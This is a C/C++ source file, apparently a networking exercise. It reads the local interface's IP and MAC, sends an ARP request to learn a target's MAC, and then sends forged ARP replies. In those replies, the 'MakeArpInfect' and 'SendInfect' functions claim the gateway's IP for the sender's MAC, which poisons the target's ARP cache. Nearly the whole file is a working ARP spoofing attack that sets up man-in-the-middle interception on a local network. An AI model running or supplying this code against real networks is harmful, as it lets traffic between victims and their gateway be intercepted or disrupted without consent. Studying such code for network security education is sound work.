#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <string.h>
#include <net/if.h>
#include "hdr.h"

void PrintMAC(uint8_t *mac){
    printf("-------------------------------\n");
    printf("Sender MAC | %02x:%02x:%02x:%02x:%02x:%02x |\n", mac[0], mac[1],mac[2],mac[3],mac[4],mac[5]);
    printf("-------------------------------\n");
}

void PrintIP(uint32_t ip){
//    printf("%s",inet_ntop(IP_version, ip_pointer, buf_pointer, buf_size));
    printf("-------------------------------\n");
    printf("Sender IP  | %3d.%3d.%3d.%3d   |\n", ip&0xFF, (ip>>8)&0xFF, (ip>>16)&0xFF, (ip>>24)&0xFF);
}

uint32_t Str2A(char *ip_string){

    unsigned int a, b, c, d;

    sscanf(ip_string,"%u.%u.%u.%u", &a, &b, &c, &d);
    return ((a << 24) | (b << 16) | (c << 8) | d);
}

uint32_t GetMyIp(char *dev){

    struct ifreq ifr;
    char ipstr[40];
    int s;

    s = socket(AF_INET,SOCK_DGRAM, 0);
    strncpy(ifr.ifr_name, dev, IFNAMSIZ);
    if (ioctl(s, SIOCGIFADDR, &ifr)<0)
        printf("ERROR");
    else
        inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2,ipstr,sizeof(struct sockaddr));
    return Str2A(ipstr);
}

void GetMyMac(char* dev, uint8_t *mac){

    struct ifreq ifr;
    int s;

    s = socket(AF_INET, SOCK_DGRAM, 0);
    strncpy(ifr.ifr_name, dev,IFNAMSIZ);
    if(ioctl(s,SIOCGIFHWADDR, &ifr) <0)
        printf("ERROR");
    else
        memcpy(mac,ifr.ifr_hwaddr.sa_data,6);
}

EthArpPacket MakeArpRequest(uint32_t source_ip, uint8_t* source_mac, uint32_t target_ip){
    EthArpPacket ARP;
    static int ETH_TYPE = 0x0806;
    static int ARP_REQUEST = 1;

    memset(ARP.eth_.Dst_mac, 0xFF, 6);
    memcpy(ARP.eth_.Src_mac,source_mac,sizeof(uint8_t)*6);
    ARP.eth_.type = htons(ETH_TYPE);

    ARP.arp_.Hw_type = htons(0x0001);
    ARP.arp_.Proto_type = htons(0x0800);
    ARP.arp_.Hw_addr_len = 0x06;
    ARP.arp_.Proto_addr_len = 0x04;
    ARP.arp_.Opcode = htons(ARP_REQUEST);

    memcpy(ARP.arp_.Src_mac,source_mac,sizeof(uint8_t)*6);
    ARP.arp_.Src_ip = htonl(source_ip);

    memset(ARP.arp_.Tag_mac, 0x00, 6);
    ARP.arp_.Tag_ip = htonl(target_ip);

    return ARP;
}

EthArpPacket MakeArpInfect(uint32_t gateway_ip, uint8_t* source_mac, uint32_t target_ip, uint8_t* target_mac){
    EthArpPacket ARP;
    static int ETH_TYPE = 0x0806;
    static int ARP_REPLY = 2;
    memcpy(ARP.eth_.Dst_mac,target_mac,sizeof(uint8_t)*6);
    memcpy(ARP.eth_.Src_mac,source_mac,sizeof(uint8_t)*6);
    ARP.eth_.type = htons(ETH_TYPE);

    ARP.arp_.Hw_type = htons(0x0001);
    ARP.arp_.Proto_type = htons(0x0800);
    ARP.arp_.Hw_addr_len = 0x06;
    ARP.arp_.Proto_addr_len = 0x04;
    ARP.arp_.Opcode = htons(ARP_REPLY);

    memcpy(ARP.arp_.Src_mac,source_mac,sizeof(uint8_t)*6);
    ARP.arp_.Src_ip = htonl(gateway_ip);
    memcpy(ARP.arp_.Tag_mac,target_mac,sizeof(uint8_t)*6);
    ARP.arp_.Tag_ip = htonl(target_ip);

    return ARP;
}

void CapArpReply(pcap_t* handle, uint32_t target_ip, uint8_t* target_mac){
    struct pcap_pkthdr* header;
    const u_char* data;
    static int ETH_TYPE = 0x0806;
    static int ARP_REPLY = 2;
    while(1){
        int res = pcap_next_ex(handle, &header, &data);
        if(res == 0) continue;
        if(res == -1 || res == -2){
            printf("pcap_next_ex return %d(%s)\n",res, pcap_geterr(handle));
        }

        EthArpPacket* capture = (EthArpPacket*)data;

        if(ntohs(capture->eth_.type) == ETH_TYPE){
            if(ntohs(capture->arp_.Opcode) == ARP_REPLY){
                if(ntohl(capture->arp_.Src_ip) == target_ip){
                    memcpy(target_mac,capture->arp_.Src_mac,sizeof(uint8_t)*6);
                    break;
                }
            }
        }
    }
}

void SendRequest(pcap_t* handle, uint32_t source_ip, uint8_t* source_mac, uint32_t target_ip, uint8_t* target_mac){
    EthArpPacket ARP = MakeArpRequest(source_ip, source_mac, target_ip);

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&ARP), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }
    CapArpReply(handle, target_ip, target_mac);
}

void SendInfect(pcap_t* handle, uint8_t* source_mac, uint32_t target_ip, uint8_t* target_mac, uint32_t gateway_ip){
    EthArpPacket ARP = MakeArpInfect(gateway_ip, source_mac, target_ip, target_mac);

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&ARP), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }
}
